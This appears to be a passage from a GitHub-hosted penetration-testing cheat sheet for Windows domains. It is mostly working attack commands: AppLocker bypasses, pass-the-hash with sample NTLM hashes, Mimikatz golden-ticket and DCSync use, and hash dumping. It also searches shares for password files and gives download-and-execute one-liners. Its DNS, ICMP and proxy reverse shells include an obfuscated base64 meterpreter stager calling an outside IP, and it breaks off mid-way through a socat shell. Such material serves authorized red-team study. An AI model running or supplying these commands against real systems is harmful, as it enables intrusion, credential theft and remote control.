+&lt;p&gt;&lt;a name="user-content-applocker"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--bypass-applocker-" class="anchor" aria-hidden="true" href="#-bypass-applocker-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Bypass Applocker &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;1. rundll32&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;rundll32.exe PowerShdll.dll,main&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455568-dfe7d7c6-ed81-11e7-9869-de2d4e92f3aa.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455568-dfe7d7c6-ed81-11e7-9869-de2d4e92f3aa.png" alt="applocker" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Reference: &lt;a href="https://github.com/p3nt4/PowerShdll"&gt;https://github.com/p3nt4/PowerShdll&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;2. Alternative powershell files&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455569-e0136c6a-ed81-11e7-9b0e-127ae9d395e0.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455569-e0136c6a-ed81-11e7-9b0e-127ae9d395e0.png" alt="applocker2" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-pth"&gt;&lt;/a&gt; &lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--pass-the-hash-" class="anchor" aria-hidden="true" href="#-pass-the-hash-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Pass The Hash &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Invoke a command Remotely &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
+ 
+ Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\bitch.txt"
+&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt; Invoke Mimikatz Remotely &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt;Invoke-WMIExec -Target SVHOST2  -Username Administrator
+-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455757-1f6aed1c-ed86-11e7-9415-595fa5e8d6e7.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455757-1f6aed1c-ed86-11e7-9415-595fa5e8d6e7.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Pass The Hash with Mimikatz &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt; Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'&lt;/pre&gt;
+&lt;p&gt;&lt;a name="user-content-krb"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--kerberos-" class="anchor" aria-hidden="true" href="#-kerberos-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Kerberos &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Generate Golden Ticket (Domain Admin Required) &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt;Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455725-7230ee30-ed85-11e7-9333-16372355ce60.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455725-7230ee30-ed85-11e7-9333-16372355ce60.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455734-89934d5c-ed85-11e7-960e-9659e099c9df.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455734-89934d5c-ed85-11e7-960e-9659e099c9df.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+  &lt;pre&gt;Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455745-9edd0360-ed85-11e7-84f0-6d62e621613b.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455745-9edd0360-ed85-11e7-84f0-6d62e621613b.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+  &lt;pre&gt;Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455747-b285372a-ed85-11e7-9374-c481108db77e.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455747-b285372a-ed85-11e7-9374-c481108db77e.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455748-bb0512c6-ed85-11e7-8d40-b6516cf8b0f3.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455748-bb0512c6-ed85-11e7-8d40-b6516cf8b0f3.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-miscwin"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--miscellaneous-" class="anchor" aria-hidden="true" href="#-miscellaneous-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Miscellaneous &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Invoke Mimikatz &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt;IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt; Mimikatz C# &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /unsafe katz.cs&lt;/pre&gt;
+&lt;p&gt;&lt;a href="https://gist.github.com/caseysmithrc/87f6572547f633f13a8482a0c91fb7b7"&gt;https://gist.github.com/caseysmithrc/87f6572547f633f13a8482a0c91fb7b7&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;In case compiler is outdated:&lt;/p&gt;
+&lt;pre&gt;nuget install Microsoft.Net.Compilers&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt; Runas Powershell &lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Start-Process powershell.exe -Verb runas&lt;/code&gt;
+&lt;code&gt;Start-Process powershell.exe -Credential &amp;lt;user&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; View Shares With Permissions &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt;powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455620-34f292b4-ed83-11e7-92b0-3b8dd387146f.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455620-34f292b4-ed83-11e7-92b0-3b8dd387146f.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; View files that contain certain words recursively &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt; ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*
+admin*","*secret*" -Recurse -ErrorAction SilentlyContinue&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455641-aa03adf4-ed83-11e7-8333-a69366714921.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455641-aa03adf4-ed83-11e7-8333-a69366714921.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; View files which name contains certain words recursively &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse -ErrorAction SilentlyContinue&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455649-dcc941ea-ed83-11e7-9428-a702f254e807.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455649-dcc941ea-ed83-11e7-9428-a702f254e807.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Connect to MSSQL Database &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')
+
+Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password  -Query "exec sp_databases" &lt;/pre&gt;
+&lt;p&gt;&lt;b&gt; Port Scanning &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')
+
+Invoke-Portscan -Hosts [ip] -TopPorts 50&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455679-6e630230-ed84-11e7-995e-2eea1a6fc8dc.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455679-6e630230-ed84-11e7-995e-2eea1a6fc8dc.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; View Domain Admins &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt; net groups /domain "Domain Admins"&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455690-9e648d78-ed84-11e7-9a84-9b335530a31e.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455690-9e648d78-ed84-11e7-9a84-9b335530a31e.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; View Domain Controlers &lt;/b&gt;&lt;/p&gt;
+  &lt;pre&gt;nltest /dclist: &lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455698-d1504074-ed84-11e7-85ad-c4bb196c9d44.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455698-d1504074-ed84-11e7-85ad-c4bb196c9d44.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Get Hashes &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455769-66cb31bc-ed86-11e7-846e-090647d8e32f.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455769-66cb31bc-ed86-11e7-846e-090647d8e32f.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Check Pass The Hash with multiple servers&lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")
+
+foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }
+
+&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34455798-0bdc77ec-ed87-11e7-9504-6b9ec6fc2a8d.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34455798-0bdc77ec-ed87-11e7-9504-6b9ec6fc2a8d.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Run web_delivery with other identity &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt; runas-cabesha-webdelivery -url [url_webdelivery] -user [url] -pass [pass] &lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/42811084-e286eb5a-89b9-11e8-8ec8-b0b8c3980774.jpg"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/42811084-e286eb5a-89b9-11e8-8ec8-b0b8c3980774.jpg" alt="cabesha" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;References: &lt;a href="https://www.hacklikeapornstar.com/" rel="nofollow"&gt;https://www.hacklikeapornstar.com/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-revshells"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--reverse-shells-" class="anchor" aria-hidden="true" href="#-reverse-shells-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Reverse Shells &lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-dns"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--reverse-dns-shell-with-dnscat-powershell-" class="anchor" aria-hidden="true" href="#-reverse-dns-shell-with-dnscat-powershell-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Reverse DNS Shell with dnscat powershell &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Server &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;ruby dnscat2.rb -e open --no-cache tunnel.domain.com&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt; Client &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1'); Start-Dnscat2 -Domain tunnel.domain.com -DNSServer 8.8.4.4 &lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/35040679-5a155bfa-fb82-11e7-98ec-ba015e3ad69c.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/35040679-5a155bfa-fb82-11e7-98ec-ba015e3ad69c.png" alt="dns" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Reference: &lt;a href="https://github.com/lukebaggett/dnscat2-powershell"&gt;https://github.com/lukebaggett/dnscat2-powershell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-icmp"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--reverse-icmp-shell-" class="anchor" aria-hidden="true" href="#-reverse-icmp-shell-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Reverse ICMP shell &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Server &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt; 
+
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+python icmpsh_m.py [IP atacante] [IP victima]
+
+&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt; Client &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress [IP atacante]&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/35213289-6ac51b00-ff5d-11e7-9b66-766af2aaf92e.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/35213289-6ac51b00-ff5d-11e7-9b66-766af2aaf92e.png" alt="icmpreverseshell" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Native ICMP shell &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt; 
+powershell -nop -Command "$IP = '10.10.14.42';$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $true;$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes('pie'), $options);while($true){$comms = $client.Send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes(''), $options);if($comms.Buffer){ $cmd = ([Text.Encoding]::ASCII).GetString($comms.Buffer);$reply = (Invoke-Expression -Command $cmd | Out-String);$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes($reply), $options);}}"
+&lt;/pre&gt;
+&lt;p&gt;Reference: &lt;a href="https://esgeeks.com/icmpsh-shell-reverse-con-icmp/" rel="nofollow"&gt;https://esgeeks.com/icmpsh-shell-reverse-con-icmp/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-httpproxy"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--reverse-http-shell-through-proxy-" class="anchor" aria-hidden="true" href="#-reverse-http-shell-through-proxy-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Reverse HTTP Shell through Proxy &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;pre&gt;use payload/python/meterpreter/reverse_http&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/33836652-3d9c9624-de8a-11e7-9869-e18c5a28ebd7.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33836652-3d9c9624-de8a-11e7-9869-e18c5a28ebd7.png" alt="proxy2" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnUHJveHlIYW5kbGVyJ10pCmhzPVtdCmhzLmFwcGVuZCh1bC5Qcm94eUhhbmRsZXIoeydodHRwJzonaHR0cDovLzE5Mi4xNjguMTA3LjIzMjo4MDgwJ30pKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cDovLzE3OC42Mi41OC4zNTo4MC9qOTkzQScpLnJlYWQoKSkK')))"&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Finally we set up the handler:&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/33836552-fd3204ac-de89-11e7-940c-71c8ab321bf7.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33836552-fd3204ac-de89-11e7-940c-71c8ab321bf7.png" alt="proxy3" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-misc"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--miscellaneous--1" class="anchor" aria-hidden="true" href="#-miscellaneous--1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Miscellaneous &lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-interactiveshell"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--interactive-reverse-shell-" class="anchor" aria-hidden="true" href="#-interactive-reverse-shell-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Interactive Reverse Shell &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Method 1 &lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;Attacker:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;socat file:`tty`,raw,echo=0 TCP-L:4444&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Victim:&lt;/p&gt;
